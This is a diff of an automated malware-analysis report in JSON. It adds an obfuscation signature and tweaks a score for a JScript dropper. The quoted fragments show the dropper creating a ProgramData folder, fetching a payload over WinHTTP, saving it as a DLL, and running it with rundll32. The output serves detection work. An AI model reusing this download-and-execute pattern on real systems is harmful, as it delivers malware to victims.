@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 911,
+    "score": 921,
     "sections": [
       {
         "auto_collapse": false,
@@ -18,7 +18,31 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: Scripting.FileSystemObject\n\n\t\tNew ActiveXObject: WinHttp.WinHttpRequest.5.1\n\n\t\tNew ActiveXObject: WScript.Shell\n\n\t\tActiveXObject(Scripting.FileSystemObject)\n\n\t\tActiveXObject(WinHttp.WinHttpRequest.5.1)\n\n\t\tActiveXObject(WScript.Shell)\n\n\t\tActiveXObject(ADODB.Stream)\n\n\t\tvar _a = new ActiveXObject(_0x4b[1])\n\t\tvar _b = new ActiveXObject(_0x4b[2])\n\t\tvar _c = new ActiveXObject(_0x4b[3])\n\t\t    var _g = new ActiveXObject(_0x4b[9])",
+        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...\n\t\tvar _a = new ActiveXObject(_0x4b[1])\n\t\tvar _b = new ActiveXObject(_0x4b[2])\n\t\tvar _c = new ActiveXObject(_0x4b[3])\n\t\tvar _d = _0x4b[18]\n\t\tvar _e = _0x4b[19]\n\t\tvar _f = _0x4b[20]\n\t\t_b[_0x4b[5]](_0x4b[4], _e, false)\n\t\t_b[_0x4b[6]]()\n\t\tvar _g = new ActiveXObject(_0x4b[9])\n\t\t_g[_0x4b[5]]()\n\t\t_g[_0x4b[11]](_b[_0x4b[8]])\n\t\t_g[_0x4b[13]](_f)\n\t\t_g[_0x4b[14]]()\n\t\t+ _f + _0x4b[22])\n\t\t+ _b[_0x4b[7]])",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "_0x_prefix": 10
+          },
+          "signatures": {
+            "_0x_prefix": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: ObfuscationPrefix",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: Scripting.FileSystemObject\n\t\tNew ActiveXObject: WinHttp.WinHttpRequest.5.1\n\t\tNew ActiveXObject: WScript.Shell\n\t\tActiveXObject(Scripting.FileSystemObject)\n\t\tActiveXObject(WinHttp.WinHttpRequest.5.1)\n\t\tActiveXObject(WScript.Shell)\n\t\tActiveXObject(ADODB.Stream)\n\t\tvar _a = new ActiveXObject(_0x4b[1])\n\t\tvar _b = new ActiveXObject(_0x4b[2])\n\t\tvar _c = new ActiveXObject(_0x4b[3])\n\t\tvar _g = new ActiveXObject(_0x4b[9])",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -42,7 +66,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[14]()\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[14]()",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -66,7 +90,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject to gain access to the computer's file system\n\t\tNew ActiveXObject: Scripting.FileSystemObject\n\n\t\tActiveXObject(Scripting.FileSystemObject)\n\n\t\tWScript.CreateObject(\"Scripting.FileSystemObject\")\n\n\t\tnew Scripting.FileSystemObject[12]()\n\n\t\tScripting.FileSystemObject[12].FolderExists(\"C:\\ProgramData\\Trdce\")\n\n\t\tScripting.FileSystemObject[12].CreateFolder(\"C:\\ProgramData\\Trdce\")\n\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...",
+        "body": "JavaScript creates an ActiveXObject to gain access to the computer's file system\n\t\tNew ActiveXObject: Scripting.FileSystemObject\n\t\tActiveXObject(Scripting.FileSystemObject)\n\t\tWScript.CreateObject(\"Scripting.FileSystemObject\")\n\t\tnew Scripting.FileSystemObject[12]()\n\t\tScripting.FileSystemObject[12].FolderExists(\"C:\\ProgramData\\Trdce\")\n\t\tScripting.FileSystemObject[12].CreateFolder(\"C:\\ProgramData\\Trdce\")\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -90,7 +114,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript sends a network request\n\t\tWinHTTP.WinHTTPRequest[13].Send()\n",
+        "body": "JavaScript sends a network request\n\t\tWinHTTP.WinHTTPRequest[13].Send()",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -114,7 +138,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[14].Run(\"rundll32 C:\\ProgramData\\Trdce\\desired.dll, HUF_inc_var\")\n",
+        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[14].Run(\"rundll32 C:\\ProgramData\\Trdce\\desired.dll, HUF_inc_var\")",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -138,7 +162,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript writes data to disk\n\t\tADODB.Stream[16].SaveToFile(\"C:\\ProgramData\\Trdce\\desired.dll\")\n\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...",
+        "body": "JavaScript writes data to disk\n\t\tADODB.Stream[16].SaveToFile(\"C:\\ProgramData\\Trdce\\desired.dll\")\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -162,7 +186,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript attempts to sleep\n\t\tWScript.Sleep(\"10000\")\n\n\t\t    WScript.Sleep(10000)",
+        "body": "JavaScript attempts to sleep or schedule execution after a given delay\n\t\tWScript.Sleep(\"10000\")\n\t\tWScript.Sleep(10000)",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -186,7 +210,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript writes executable file to disk\n\t\tADODB.Stream[16].SaveToFile(\"C:\\ProgramData\\Trdce\\desired.dll\")\n\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...",
+        "body": "JavaScript writes executable file to disk\n\t\tADODB.Stream[16].SaveToFile(\"C:\\ProgramData\\Trdce\\desired.dll\")\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -332,6 +356,13 @@
         "attack_ids": [],
         "heur_id": 2,
         "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "_0x_prefix"
+        ]
       },
       {
         "attack_ids": [],
